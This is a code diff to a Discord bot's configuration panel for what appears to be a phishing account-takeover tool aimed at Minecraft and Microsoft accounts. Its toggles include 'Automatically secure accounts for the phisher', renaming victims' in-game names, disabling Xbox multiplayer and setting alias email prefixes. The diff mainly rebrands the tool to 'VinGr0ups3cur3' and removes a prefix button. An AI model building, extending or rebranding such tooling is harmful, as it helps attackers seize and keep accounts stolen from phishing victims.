@@ -34,7 +34,7 @@ module.exports = async (username) => {
         .setTitle(`Secure Config`)
         .setColor(0xb2c7e0)
         .addFields(
-            { name: "Autosecure", value: `${settings.auto_secure ? "✅" : "❌"}`, inline: true },
+            { name: "VinGr0ups3cur3", value: `${settings.auto_secure ? "✅" : "❌"}`, inline: true },
             { name: "Change IGN", value: `${settings.change_ign ? "✅" : "❌"}`, inline: true },
             { name: "Disable Multiplayer", value: `${settings.multiplayer ? "✅" : "❌"}`, inline: true },
             { name: "Secure non-mc", value: `${settings.secureifnomc ? "✅" : "❌"}`, inline: true },
@@ -64,7 +64,7 @@ const embed2 = new EmbedBuilder()
         { name: "Custom PFP", value: settings.pfp && settings.pfp !== (config.defaultpfp || "https://website.donutsmp.org/bcGCsev.png") && settings.pfp !== "https://static.wikia.nocookie.net/leagueoflegends/images/e/e2/Warding_Totem_item.png/revision/latest/smart/width/250/height/250?cb=20201109132946" ? "Custom" : "Default", inline: true },
         { name: "Change Language", value: settings.changelanguage ? "✅" : "❌", inline: true },
         { name: "Custom Language", value: settings.language ? `${settings.language}` : "Default: en-US", inline: true },
-        { name: "Email/Alias Prefix", value: settings.prefix ? settings.prefix : "HachiiroMC", inline: true }
+        { name: "Email/Alias Prefix", value: config.prefix || "vinGr0up", inline: true }
     );
 
     const featureMenu = new StringSelectMenuBuilder()
@@ -73,7 +73,7 @@ const embed2 = new EmbedBuilder()
         .setMaxValues(18)
         .setMinValues(1)
         .addOptions([
-            { label: `${settings.auto_secure ? 'Stop' : 'Start'} Autosecure`, description: 'Automatically secure accounts for the phisher', value: `settings|auto_secure|${settings.auto_secure ? '0' : '1'}` },
+            { label: `${settings.auto_secure ? 'Stop' : 'Start'} VinGr0ups3cur3`, description: 'Automatically secure accounts for the phisher', value: `settings|auto_secure|${settings.auto_secure ? '0' : '1'}` },
             { label: `${settings.change_ign ? 'Stop' : 'Start'} Name Changer`, description: 'Adds an underscore to mc username', value: `settings|change_ign|${settings.change_ign ? '0' : '1'}` },
             { label: `${settings.multiplayer ? 'Stop' : 'Start'} Multiplayer Remover`, description: 'Disables XBOX Multiplayer in privacy settings', value: `settings|multiplayer|${settings.multiplayer ? '0' : '1'}` },
             { label: `${settings.secureifnomc ? 'Stop' : 'Start'} Securing fake accounts`, description: `Secure account if it doesn't own Minecraft`, value: `settings|secureifnomc|${settings.secureifnomc ? '0' : '1'}` },
@@ -103,10 +103,6 @@ const embed2 = new EmbedBuilder()
         new ButtonBuilder()
             .setCustomId(`showpfp|${username}|true`)
             .setLabel(`Show PFP`)
-            .setStyle(ButtonStyle.Primary),
-        new ButtonBuilder()
-            .setCustomId(`changeprefix`)
-            .setLabel(`Change Prefix`)
             .setStyle(ButtonStyle.Primary)
     );
 
